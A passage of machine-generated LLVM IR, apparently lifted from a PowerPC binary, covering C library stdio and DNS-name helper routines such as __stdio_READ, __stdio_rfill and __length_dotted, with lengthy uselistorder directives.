  uselistorder i32 23, { 10, 11, 12, 13, 6, 7, 8, 0, 1, 3, 2, 4, 5, 9 }
  uselistorder i32 18, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* @r30, { 76, 77, 78, 8, 79, 81, 83, 84, 85, 86, 87, 80, 82, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 102, 99, 100, 5, 101, 4, 105, 103, 104, 106, 107, 109, 108, 6, 110, 32, 33, 34, 9, 35, 36, 37, 111, 112, 113, 114, 115, 116, 117, 118, 17, 119, 120, 121, 122, 123, 124, 125, 126, 38, 39, 72, 40, 41, 42, 43, 44, 73, 74, 10, 45, 46, 47, 48, 49, 11, 144, 145, 146, 147, 12, 130, 148, 159, 149, 150, 27, 0, 29, 13, 30, 31, 131, 132, 133, 127, 128, 129, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 75, 151, 152, 153, 154, 155, 156, 157, 14, 158, 50, 51, 52, 53, 54, 55, 56, 2, 58, 18, 59, 15, 60, 61, 57, 62, 63, 64, 65, 66, 67, 68, 16, 69, 70, 3, 71, 28 }
  uselistorder i1 false, { 2, 3, 5, 13, 6, 7, 9, 10, 0, 11, 17, 18, 19, 14, 15, 16, 4, 12, 1, 8, 20 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 16, 17, 18, 19, 5, 6, 7, 8, 9, 10, 11, 12, 1, 2, 13, 14, 15, 3, 4, 0 }
  uselistorder i32* @r25, { 11, 12, 13, 15, 16, 14, 17, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 31, 34, 3, 4, 27, 28, 29, 30, 0, 7, 8, 9, 10, 32, 33, 5, 6 }
  uselistorder i32* @r26, { 1, 30, 31, 32, 33, 34, 35, 36, 39, 37, 38, 40, 41, 42, 43, 44, 3, 4, 45, 46, 47, 48, 49, 50, 51, 2, 52, 53, 54, 55, 56, 57, 58, 59, 60, 12, 13, 77, 5, 6, 7, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 0, 75, 76, 10, 11, 8, 9 }
  uselistorder i32 ()* @__asm_mfcr, { 20, 31, 19, 18, 17, 12, 28, 26, 35, 9, 8, 7, 6, 15, 34, 30, 29, 10, 33, 11, 39, 22, 21, 38, 25, 4, 14, 24, 13, 1, 32, 23, 16, 37, 36, 5, 3, 2, 0, 27 }
  uselistorder label %dec_label_pc_1001444c, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001443c, { 1, 0 }
  uselistorder label %dec_label_pc_10014424, { 1, 0 }
  uselistorder label %dec_label_pc_10014420, { 1, 0 }
  uselistorder label %dec_label_pc_10014410, { 1, 0 }
  uselistorder label %dec_label_pc_100143cc, { 1, 0 }
  uselistorder label %dec_label_pc_100143b4, { 1, 0 }
  uselistorder label %dec_label_pc_100143ac, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_10014468 = load i32, i32* @r3, align 4
  store i32 %v0_10014468, i32* %r11.global-to-local, align 4
  %v3_10014468 = icmp eq i32 %v0_10014468, 0
  %v0_10014470 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10014468, i32 %v0_10014470)
  %v0_10014480 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1001448c

dec_label_pc_10014478:                            ; preds = %dec_label_pc_10014488
  %v1_10014478 = add i32 %v1_1001448c, 2
  br label %dec_label_pc_100144a8

dec_label_pc_10014488:                            ; preds = %dec_label_pc_1001448c
  %v2_100144a0 = add i32 %v1_10014490, %v5_1001448c
  %v3_1001449c = icmp eq i32 %v1_10014498, 192
  br i1 %v3_1001449c, label %dec_label_pc_10014478, label %dec_label_pc_1001448c

dec_label_pc_1001448c:                            ; preds = %dec_label_pc_10014488, %entry
  %v1_1001448c = phi i32 [ %v2_100144a0, %dec_label_pc_10014488 ], [ %v0_10014480, %entry ]
  %v0_1001448c = load i32, i32* %r11.global-to-local, align 4
  %v2_1001448c = add i32 %v0_1001448c, %v1_1001448c
  %v3_1001448c = inttoptr i32 %v2_1001448c to i8*
  %v4_1001448c = load i8, i8* %v3_1001448c, align 1
  %v5_1001448c = zext i8 %v4_1001448c to i32
  %v1_10014490 = add i32 %v1_1001448c, 1
  %v3_10014494 = icmp eq i8 %v4_1001448c, 0
  %v1_10014498 = call i32 @__asm_rlwinm(i32 %v5_1001448c, i32 0, i32 24, i32 25)
  br i1 %v3_10014494, label %dec_label_pc_100144a8, label %dec_label_pc_10014488

dec_label_pc_100144a8:                            ; preds = %dec_label_pc_1001448c, %dec_label_pc_10014478
  %v1_100144a8 = phi i32 [ %v1_10014478, %dec_label_pc_10014478 ], [ %v1_10014490, %dec_label_pc_1001448c ]
  %v0_100144a8 = load i32, i32* @r4, align 4
  %v2_100144a8 = sub i32 %v1_100144a8, %v0_100144a8
  ret i32 %v2_100144a8

; uselistorder directives
  uselistorder i32 %v1_10014490, { 1, 0 }
  uselistorder i32 %v5_1001448c, { 1, 0 }
  uselistorder i32 %v1_1001448c, { 2, 1, 0 }
  uselistorder i32 %v0_10014468, { 1, 0 }
  uselistorder i32 25, { 3, 4, 5, 6, 7, 2, 1, 0 }
  uselistorder i8 0, { 37, 35, 4, 38, 2, 39, 40, 5, 24, 44, 42, 23, 43, 41, 22, 45, 46, 47, 48, 6, 50, 49, 25, 7, 51, 52, 8, 53, 54, 55, 56, 21, 27, 59, 57, 58, 26, 60, 61, 9, 63, 62, 28, 64, 65, 0, 66, 67, 68, 69, 10, 70, 71, 11, 1, 12, 72, 73, 74, 76, 77, 78, 79, 75, 80, 13, 81, 82, 83, 84, 86, 87, 88, 89, 85, 90, 3, 14, 15, 16, 17, 18, 19, 91, 92, 94, 93, 20, 95, 96, 97, 98, 99, 101, 29, 102, 103, 100, 104, 105, 106, 107, 109, 108, 110, 111, 112, 113, 114, 115, 116, 117, 119, 118, 121, 120, 122, 30, 124, 123, 36, 125, 31, 126, 128, 129, 127, 32, 130, 131, 34, 132, 33, 133, 134, 135, 136, 137 }
  uselistorder i32 192, { 3, 4, 2, 1, 0 }
  uselistorder i32 2, { 0, 4, 5, 119, 120, 6, 121, 48, 122, 123, 30, 1, 2, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 7, 136, 8, 88, 89, 90, 31, 29, 137, 138, 139, 140, 141, 49, 50, 51, 142, 143, 144, 101, 102, 149, 42, 9, 10, 3, 52, 145, 11, 12, 32, 40, 103, 104, 13, 105, 115, 116, 53, 54, 55, 93, 56, 94, 57, 95, 150, 33, 14, 15, 58, 59, 60, 61, 62, 16, 46, 47, 63, 64, 148, 45, 152, 17, 18, 34, 35, 36, 37, 38, 65, 146, 147, 39, 106, 107, 108, 19, 20, 21, 22, 23, 109, 110, 24, 112, 113, 114, 28, 111, 66, 25, 26, 151, 153, 67, 91, 69, 70, 68, 71, 92, 73, 72, 43, 74, 75, 76, 77, 78, 96, 97, 98, 99, 100, 79, 41, 118, 80, 81, 82, 83, 84, 117, 44, 27, 85, 86, 87 }
  uselistorder i32* @r4, { 82, 83, 1, 84, 85, 86, 87, 2, 88, 89, 3, 90, 91, 8, 9, 92, 93, 94, 95, 96, 97, 98, 99, 100, 123, 120, 121, 101, 102, 103, 104, 105, 5, 107, 108, 109, 110, 111, 36, 10, 77, 79, 80, 58, 78, 59, 60, 61, 62, 63, 64, 133, 6, 7, 48, 49, 125, 18, 19, 13, 56, 57, 122, 50, 11, 112, 113, 119, 106, 81, 126, 127, 128, 65, 66, 67, 12, 68, 69, 114, 115, 116, 117, 118, 4, 51, 52, 132, 70, 71, 72, 73, 0, 74, 75, 76, 124, 45, 46, 47, 129, 130, 131, 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 53, 54, 55 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 16, 17, 19, 20, 21, 22, 23, 24, 0, 25, 30, 26, 1, 2, 3, 4, 5, 6, 27, 15, 9, 10, 11, 12, 7, 28, 29, 18, 32, 31, 8, 13, 14 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_100144bc = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100144c8 = load i16, i16* %arg1, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100144d0 = and i16 %v3_100144c8, 4
  %v3_100144d0 = icmp eq i16 %v1_100144d0, 0
  br i1 %v3_100144d0, label %dec_label_pc_100144d8, label %dec_label_pc_10014510

dec_label_pc_100144d8:                            ; preds = %entry
  %tmp10 = icmp sgt i32 %arg2, -1
  br i1 %tmp10, label %dec_label_pc_100144e4, label %dec_label_pc_100144dc

dec_label_pc_100144dc:                            ; preds = %dec_label_pc_100144d8
  br label %dec_label_pc_100144e4

dec_label_pc_100144e4:                            ; preds = %dec_label_pc_100144d8, %dec_label_pc_100144dc
  %v1_100144e4 = add i32 %tmp, 4
  %v2_100144e4 = inttoptr i32 %v1_100144e4 to i32*
  %v3_100144e4 = load i32, i32* %v2_100144e4, align 4
  store i32 %v3_100144e4, i32* %r3.global-to-local, align 4
  store i32 268518636, i32* @lr, align 4
  %v1_100144e8 = call i32 @__libc_read(i32 %v3_100144e4)
  store i32 %v1_100144e8, i32* %r3.global-to-local, align 4
  %v2_100144ec = icmp sgt i32 %v1_100144e8, 0
  br i1 %v2_100144ec, label %dec_label_pc_10014510, label %dec_label_pc_100144f4

dec_label_pc_100144f4:                            ; preds = %dec_label_pc_100144e4
  %v3_100144ec = icmp eq i32 %v1_100144e8, 0
  %v0_100144f4 = load i32, i32* @r31, align 4
  %v1_100144f4 = inttoptr i32 %v0_100144f4 to i16*
  %v2_100144f4 = load i16, i16* %v1_100144f4, align 2
  br i1 %v3_100144ec, label %dec_label_pc_100144fc, label %dec_label_pc_10014504

dec_label_pc_100144fc:                            ; preds = %dec_label_pc_100144f4
  %v1_100144fc = or i16 %v2_100144f4, 4
  br label %dec_label_pc_1001450c

dec_label_pc_10014504:                            ; preds = %dec_label_pc_100144f4
  %v1_10014504 = or i16 %v2_100144f4, 8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001450c

dec_label_pc_1001450c:                            ; preds = %dec_label_pc_100144fc, %dec_label_pc_10014504
  %v1_100144fc.sink.off0 = phi i16 [ %v1_100144fc, %dec_label_pc_100144fc ], [ %v1_10014504, %dec_label_pc_10014504 ]
  store i16 %v1_100144fc.sink.off0, i16* %v1_100144f4, align 2
  %v0_10014520.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014510

dec_label_pc_10014510:                            ; preds = %entry, %dec_label_pc_100144e4, %dec_label_pc_1001450c
  %v0_10014520 = phi i32 [ 0, %entry ], [ %v1_100144e8, %dec_label_pc_100144e4 ], [ %v0_10014520.pre, %dec_label_pc_1001450c ]
  store i32 %v0_100144bc, i32* @r31, align 4
  ret i32 %v0_10014520

; uselistorder directives
  uselistorder i16 %v2_100144f4, { 1, 0 }
  uselistorder i32 %v1_100144e8, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 1, 5, 2, 3, 0 }
  uselistorder i32 (i32)* @__libc_read, { 0, 2, 1 }
  uselistorder i32 4, { 237, 238, 239, 4, 111, 132, 5, 6, 242, 240, 241, 143, 243, 244, 245, 127, 7, 246, 247, 248, 249, 250, 251, 252, 8, 253, 9, 10, 11, 133, 254, 256, 144, 257, 258, 259, 12, 13, 128, 174, 14, 15, 190, 191, 192, 260, 16, 261, 145, 262, 193, 194, 195, 263, 264, 146, 17, 18, 294, 295, 147, 19, 20, 116, 21, 22, 23, 24, 25, 26, 265, 266, 148, 27, 28, 2, 29, 0, 196, 3, 30, 1, 274, 149, 31, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 226, 207, 296, 208, 117, 310, 317, 32, 33, 34, 35, 36, 297, 298, 37, 299, 38, 300, 39, 40, 162, 41, 42, 163, 43, 176, 177, 178, 185, 186, 187, 44, 164, 45, 46, 47, 165, 48, 166, 167, 277, 279, 278, 275, 276, 268, 269, 270, 271, 280, 281, 282, 272, 273, 49, 175, 50, 283, 150, 284, 285, 118, 51, 52, 286, 53, 287, 288, 289, 290, 291, 292, 129, 54, 293, 130, 227, 55, 168, 301, 302, 209, 56, 57, 58, 131, 59, 138, 267, 60, 61, 255, 62, 63, 311, 312, 313, 151, 314, 315, 316, 64, 303, 304, 305, 114, 115, 306, 307, 152, 308, 309, 65, 66, 67, 68, 69, 70, 71, 72, 210, 73, 211, 212, 135, 213, 214, 215, 216, 217, 74, 75, 218, 219, 136, 220, 221, 137, 222, 223, 225, 76, 77, 112, 113, 224, 78, 79, 119, 80, 169, 81, 120, 82, 83, 84, 85, 170, 171, 153, 172, 173, 139, 140, 86, 87, 154, 159, 160, 88, 134, 179, 180, 155, 181, 182, 183, 184, 188, 121, 89, 122, 90, 189, 91, 156, 141, 157, 92, 123, 158, 124, 93, 125, 94, 95, 228, 96, 97, 98, 229, 99, 230, 100, 231, 101, 232, 102, 233, 103, 234, 104, 235, 236, 105, 126, 106, 107, 108, 109, 110, 142, 161 }
  uselistorder i16 0, { 0, 13, 1, 2, 11, 3, 4, 5, 6, 7, 12, 8, 9, 10, 14, 15, 16, 17, 18 }
  uselistorder label %dec_label_pc_10014510, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001450c, { 1, 0 }
  uselistorder label %dec_label_pc_100144e4, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10014524 = load i32, i32* @lr, align 4
  store i32 %v0_10014524, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_10014538 = add i32 %arg1, 8
  %v2_10014538 = inttoptr i32 %v1_10014538 to i32*
  %v3_10014538 = load i32, i32* %v2_10014538, align 4
  %v1_1001453c = add i32 %arg1, 12
  %v2_1001453c = inttoptr i32 %v1_1001453c to i32*
  %v3_1001453c = load i32, i32* %v2_1001453c, align 4
  %v2_10014540 = sub i32 %v3_1001453c, %v3_10014538
  store i32 268518728, i32* @lr, align 4
  %v3_10014544 = inttoptr i32 %v3_10014538 to i16*
  %v4_10014544 = call i32 @__stdio_READ(i16* %v3_10014544, i32 %v2_10014540, i32 %v2_10014540)
  %v0_10014548 = load i32, i32* @r29, align 4
  %v1_10014548 = add i32 %v0_10014548, 8
  %v2_10014548 = inttoptr i32 %v1_10014548 to i32*
  %v3_10014548 = load i32, i32* %v2_10014548, align 4
  %v2_1001454c = add i32 %v3_10014548, %v4_10014544
  store i32 %v2_1001454c, i32* %r0.global-to-local, align 4
  %v2_10014550 = add i32 %v0_10014548, 16
  %v3_10014550 = inttoptr i32 %v2_10014550 to i32*
  store i32 %v3_10014548, i32* %v3_10014550, align 4
  %v0_10014554 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014554 = load i32, i32* @r29, align 4
  %v2_10014554 = add i32 %v1_10014554, 20
  %v3_10014554 = inttoptr i32 %v2_10014554 to i32*
  store i32 %v0_10014554, i32* %v3_10014554, align 4
  store i32 %v0_10014524, i32* %r0.global-to-local, align 4
  ret i32 %v4_10014544

; uselistorder directives
  uselistorder i32 %v3_10014548, { 1, 0 }
  uselistorder i32 %v4_10014544, { 1, 0 }
  uselistorder i32 %v3_10014538, { 1, 0 }
  uselistorder i32 20, { 30, 31, 32, 33, 34, 35, 36, 1, 17, 18, 19, 28, 29, 5, 6, 13, 7, 0, 38, 39, 20, 21, 22, 23, 24, 26, 27, 25, 37, 8, 9, 10, 11, 12, 4, 14, 2, 3, 15, 16 }
  uselistorder i32 12, { 45, 46, 47, 48, 49, 0, 50, 51, 52, 11, 15, 53, 54, 55, 7, 8, 9, 12, 32, 33, 34, 35, 36, 37, 38, 39, 5, 6, 40, 44, 41, 66, 16, 23, 30, 17, 57, 58, 59, 60, 4, 56, 1, 2, 3, 13, 61, 62, 63, 64, 67, 42, 43, 18, 19, 20, 21, 22, 10, 14, 24, 25, 26, 27, 28, 29, 31, 65 }
  uselistorder i32* @r29, { 69, 70, 71, 72, 73, 74, 75, 76, 135, 136, 1, 77, 14, 78, 79, 80, 81, 83, 82, 84, 85, 86, 87, 88, 20, 21, 22, 23, 24, 2, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 15, 101, 102, 103, 104, 105, 106, 16, 3, 0, 107, 108, 109, 110, 111, 112, 4, 113, 35, 114, 115, 116, 117, 118, 119, 137, 138, 65, 66, 37, 38, 39, 36, 67, 17, 40, 41, 5, 42, 43, 44, 45, 46, 47, 139, 140, 141, 142, 143, 144, 145, 6, 27, 34, 125, 126, 127, 128, 129, 7, 130, 131, 120, 121, 122, 123, 124, 132, 133, 134, 8, 68, 9, 146, 147, 148, 48, 49, 10, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 63, 11, 13, 12, 64, 19, 61, 62, 149, 150, 151, 152, 25, 26, 28, 29, 30, 31, 32, 33, 18 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v0_10014574 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10014580 = load i16, i16* %arg1, align 2
  %v4_10014580 = zext i16 %v3_10014580 to i32
  %v2_10014584 = and i32 %v4_10014580, %arg2
  %v5_10014584 = icmp eq i32 %v2_10014584, 0
  br i1 %v5_10014584, label %dec_label_pc_1001458c, label %dec_label_pc_1001459c

dec_label_pc_1001458c:                            ; preds = %entry
  %v1_1001458c = and i32 %v4_10014580, 2176
  %v3_1001458c = icmp eq i32 %v1_1001458c, 0
  br i1 %v3_1001458c, label %dec_label_pc_10014594, label %dec_label_pc_100145a8

dec_label_pc_10014594:                            ; preds = %dec_label_pc_1001458c
  %v2_10014594 = or i32 %v4_10014580, %arg2
  %v1_10014598 = trunc i32 %v2_10014594 to i16
  store i16 %v1_10014598, i16* %arg1, align 2
  %v0_1001459c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001459c

dec_label_pc_1001459c:                            ; preds = %entry, %dec_label_pc_10014594
  %v0_1001459c = phi i32 [ %tmp, %entry ], [ %v0_1001459c.pre, %dec_label_pc_10014594 ]
  %v1_1001459c = inttoptr i32 %v0_1001459c to i16*
  %v2_1001459c = load i16, i16* %v1_1001459c, align 2
  %v3_1001459c = zext i16 %v2_1001459c to i32
  %v1_100145a0 = and i32 %v3_1001459c, 16
  %v3_100145a0 = icmp eq i32 %v1_100145a0, 0
  br i1 %v3_100145a0, label %dec_label_pc_100145c4, label %dec_label_pc_100145a8

dec_label_pc_100145a8:                            ; preds = %dec_label_pc_1001458c, %dec_label_pc_1001459c
  %v0_100145a8 = call i32 @__errno_location()
  store i32 %v0_100145a8, i32* %r3.global-to-local, align 4
  %v2_100145b0 = inttoptr i32 %v0_100145a8 to i32*
  store i32 9, i32* %v2_100145b0, align 4
  br label %dec_label_pc_100145b4

dec_label_pc_100145b4:                            ; preds = %dec_label_pc_100145cc, %dec_label_pc_100145a8
  %v0_100145b4 = load i32, i32* @r31, align 4
  %v1_100145b4 = inttoptr i32 %v0_100145b4 to i16*
  %v2_100145b4 = load i16, i16* %v1_100145b4, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_100145bc = or i16 %v2_100145b4, 8
  br label %dec_label_pc_100145f8

dec_label_pc_100145c4:                            ; preds = %dec_label_pc_1001459c
  %v1_100145c4 = and i32 %v3_1001459c, 64
  %v3_100145c4 = icmp eq i32 %v1_100145c4, 0
  br i1 %v3_100145c4, label %dec_label_pc_100145ec, label %dec_label_pc_100145cc

dec_label_pc_100145cc:                            ; preds = %dec_label_pc_100145c4
  store i32 268518864, i32* @lr, align 4
  %v0_100145cc = call i32 @__stdio_wcommit()
  store i32 %v0_100145cc, i32* %r3.global-to-local, align 4
  %v3_100145d0 = icmp eq i32 %v0_100145cc, 0
  br i1 %v3_100145d0, label %dec_label_pc_100145d8, label %dec_label_pc_100145b4

dec_label_pc_100145d8:                            ; preds = %dec_label_pc_100145cc
  %v0_100145d8 = load i32, i32* @r31, align 4
  %v1_100145d8 = inttoptr i32 %v0_100145d8 to i16*
  %v2_100145d8 = load i16, i16* %v1_100145d8, align 2
  %v3_100145d8 = zext i16 %v2_100145d8 to i32
  %v1_100145dc = add i32 %v0_100145d8, 8
  %v2_100145dc = inttoptr i32 %v1_100145dc to i32*
  %v3_100145dc = load i32, i32* %v2_100145dc, align 4
  %v1_100145e0 = call i32 @__asm_rlwinm(i32 %v3_100145d8, i32 0, i32 26, i32 24)
  %v2_100145e0 = trunc i32 %v1_100145e0 to i16
  %v1_100145e4 = load i32, i32* @r31, align 4
  %v2_100145e4 = add i32 %v1_100145e4, 28
  %v3_100145e4 = inttoptr i32 %v2_100145e4 to i32*
  store i32 %v3_100145dc, i32* %v3_100145e4, align 4
  %v3_100145e8 = load i32, i32* @r31, align 4
  %v4_100145e8 = inttoptr i32 %v3_100145e8 to i16*
  store i16 %v2_100145e0, i16* %v4_100145e8, align 2
  %v0_100145ec.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100145ec

dec_label_pc_100145ec:                            ; preds = %dec_label_pc_100145c4, %dec_label_pc_100145d8
  %v0_100145ec = phi i32 [ %v0_1001459c, %dec_label_pc_100145c4 ], [ %v0_100145ec.pre, %dec_label_pc_100145d8 ]
  %v1_100145ec = inttoptr i32 %v0_100145ec to i16*
  %v2_100145ec = load i16, i16* %v1_100145ec, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_100145f4 = or i16 %v2_100145ec, 1
  br label %dec_label_pc_100145f8

dec_label_pc_100145f8:                            ; preds = %dec_label_pc_100145b4, %dec_label_pc_100145ec
  %v2_100145f8 = phi i32 [ %v0_100145b4, %dec_label_pc_100145b4 ], [ %v0_100145ec, %dec_label_pc_100145ec ]
  %storemerge.off0 = phi i16 [ %v1_100145bc, %dec_label_pc_100145b4 ], [ %v1_100145f4, %dec_label_pc_100145ec ]
  %v3_100145f8 = inttoptr i32 %v2_100145f8 to i16*
  store i16 %storemerge.off0, i16* %v3_100145f8, align 2
  store i32 %v0_10014574, i32* @r31, align 4
  %v0_1001460c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001460c

; uselistorder directives
  uselistorder i32 %v4_10014580, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 3, 2, 4 }
  uselistorder i32 28, { 29, 30, 31, 32, 33, 3, 4, 9, 34, 35, 36, 17, 41, 37, 0, 38, 39, 40, 5, 6, 28, 10, 18, 19, 20, 21, 22, 23, 26, 24, 25, 1, 27, 42, 11, 2, 7, 8, 12, 13, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 21, 4, 19, 20, 1, 50, 51, 47, 48, 0, 49, 2, 52, 53, 54, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 26, 3, 22, 23, 24, 25, 55 }
  uselistorder i32 24, { 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 15, 46, 47, 48, 27, 26, 4, 13, 5, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 49, 50, 6, 7, 8, 9, 1, 2, 3, 10, 11, 12, 14, 0, 28 }
  uselistorder i32 26, { 6, 7, 8, 1, 3, 4, 5, 2, 0 }
  uselistorder i32 8, { 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 18, 19, 92, 93, 94, 95, 96, 97, 24, 25, 20, 13, 14, 15, 26, 27, 28, 29, 30, 98, 99, 100, 101, 102, 103, 104, 105, 17, 47, 106, 110, 0, 48, 49, 50, 51, 52, 53, 54, 55, 10, 78, 79, 56, 121, 122, 129, 132, 8, 36, 37, 11, 31, 12, 38, 45, 32, 114, 113, 111, 112, 107, 108, 109, 115, 116, 117, 1, 118, 119, 120, 21, 126, 127, 128, 2, 133, 3, 130, 131, 57, 58, 59, 60, 61, 22, 62, 63, 64, 65, 4, 5, 66, 67, 9, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 7, 6, 123, 124, 125, 33, 34, 35, 23, 39, 40, 41, 42, 43, 44, 46, 80, 81, 16 }
  uselistorder i32 ()* @__stdio_wcommit, { 3, 2, 1, 6, 5, 4, 0 }
  uselistorder i32 64, { 6, 7, 8, 3, 4, 9, 5, 1, 10, 11, 0, 2 }
  uselistorder i16 8, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 9, { 1, 20, 21, 22, 23, 11, 2, 12, 3, 18, 0, 13, 14, 15, 16, 17, 4, 5, 6, 7, 8, 9, 10, 19 }
  uselistorder i32 ()* @__errno_location, { 32, 48, 30, 66, 65, 64, 29, 22, 28, 47, 46, 27, 18, 26, 41, 45, 39, 55, 14, 13, 12, 11, 23, 10, 8, 54, 53, 57, 56, 63, 62, 61, 24, 52, 38, 21, 3, 2, 44, 43, 42, 0, 15, 51, 17, 16, 60, 33, 31, 59, 36, 7, 20, 35, 19, 4, 50, 34, 25, 58, 40, 9, 6, 5, 1, 67, 49, 37 }
  uselistorder i32 16, { 57, 58, 59, 60, 61, 62, 63, 9, 64, 65, 10, 66, 67, 0, 68, 69, 1, 70, 11, 71, 72, 73, 2, 74, 75, 32, 33, 76, 77, 78, 34, 35, 36, 37, 38, 39, 40, 52, 53, 41, 42, 43, 44, 82, 45, 4, 21, 19, 24, 20, 79, 80, 86, 87, 88, 46, 47, 48, 49, 50, 51, 83, 84, 85, 12, 13, 22, 14, 23, 6, 15, 18, 25, 5, 26, 27, 28, 29, 30, 31, 16, 54, 3, 55, 7, 8, 56, 17, 81 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder i32* @r31, { 140, 6, 141, 142, 143, 144, 7, 145, 146, 147, 148, 149, 150, 151, 2, 9, 152, 8, 153, 154, 155, 10, 156, 157, 11, 158, 159, 12, 160, 161, 162, 13, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 46, 51, 14, 40, 15, 16, 52, 53, 54, 177, 178, 179, 180, 1, 181, 182, 183, 184, 185, 186, 187, 188, 17, 189, 190, 191, 192, 18, 193, 194, 195, 196, 197, 198, 199, 200, 19, 43, 201, 3, 202, 203, 20, 204, 76, 77, 78, 79, 80, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 217, 216, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 81, 82, 83, 84, 85, 86, 87, 88, 89, 21, 90, 231, 232, 233, 234, 22, 23, 235, 24, 270, 271, 272, 25, 237, 236, 4, 238, 239, 240, 241, 242, 243, 244, 245, 62, 63, 64, 65, 125, 26, 135, 91, 92, 93, 136, 137, 138, 126, 127, 27, 128, 129, 130, 131, 28, 132, 29, 133, 134, 94, 45, 95, 0, 273, 274, 275, 30, 47, 276, 41, 249, 31, 250, 282, 283, 66, 44, 67, 68, 277, 280, 281, 60, 61, 69, 70, 71, 72, 55, 56, 57, 58, 59, 74, 75, 5, 251, 252, 253, 254, 255, 256, 257, 258, 246, 247, 248, 259, 260, 261, 33, 262, 263, 264, 32, 265, 266, 267, 268, 269, 139, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 36, 35, 115, 34, 119, 120, 37, 121, 122, 123, 124, 49, 50, 117, 116, 118, 278, 38, 279, 48, 39, 42, 73 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100145f8, { 1, 0 }
  uselistorder label %dec_label_pc_100145ec, { 1, 0 }
  uselistorder label %dec_label_pc_100145a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001459c, { 1, 0 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002b000.786 to i32), i32* %r31.global-to-local, align 4
  %v3_1001462c = load i32, i32* @global_var_1002b000.786, align 4
  %v3_10014630 = icmp eq i32 %v3_1001462c, -1
  br i1 %v3_10014630, label %dec_label_pc_1001464c, label %dec_label_pc_10014638

dec_label_pc_10014638:                            ; preds = %entry, %dec_label_pc_10014638
  %v0_10014638 = phi i32 [ %v3_10014640, %dec_label_pc_10014638 ], [ %v3_1001462c, %entry ]
  call void @__pseudo_call(i32 %v0_10014638)
  %v0_10014640 = load i32, i32* %r31.global-to-local, align 4
  %v1_10014640 = add i32 %v0_10014640, -4
  %v2_10014640 = inttoptr i32 %v1_10014640 to i32*
  %v3_10014640 = load i32, i32* %v2_10014640, align 4
